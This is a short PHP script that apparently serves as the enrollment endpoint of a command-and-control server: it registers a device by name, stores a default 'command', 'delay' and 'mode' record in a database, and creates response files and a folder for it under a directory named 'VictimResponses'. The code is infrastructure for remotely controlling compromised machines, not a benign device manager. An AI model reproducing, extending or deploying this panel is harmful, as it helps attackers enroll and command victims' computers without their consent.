<?php
	include("conf.php");
	$timeDate=gmdate("d/m/Y")."\t".gmdate("h:i a");
	$conn=new mysqli($server, $username, $password, $db);
	$sql="INSERT INTO ".$table."(`Value`, `Extra`, `Operand`) VALUES(?, ?, ?)";
	if(isset($_REQUEST["devName"])){
		$dev_name=$_REQUEST["devName"];
		if(!$conn->connect_errno) {
			if($query=$conn->prepare("SHOW TABLE STATUS WHERE NAME=\"".$table."\"")) {
				$query->execute();
				$raw=$query->get_result();
				$res=$raw->fetch_assoc();
				$next_val=$res["Auto_increment"];
				print $next_val;
			}
			if($query=$conn->prepare($sql)) {
				$default_data=[
					"delay"=>5,
					"command"=>"null",
					"mode"=>0
				];
				$default_opr=json_encode($default_data);
				$query->bind_param("sss", $timeDate, $dev_name, $default_opr);
				$query->execute();
				$file=fopen("VictimResponses/$next_val.resp", "w");
				fwrite($file, "");
				fclose($file);
				$file=fopen("VictimResponses/$next_val"."f.resp", "w");
				fwrite($file, "");
				fclose($file);
				mkdir("VictimResponses/$next_val");
				print "\nSuccess";
			}	
			$conn->close();
		}
	}
?>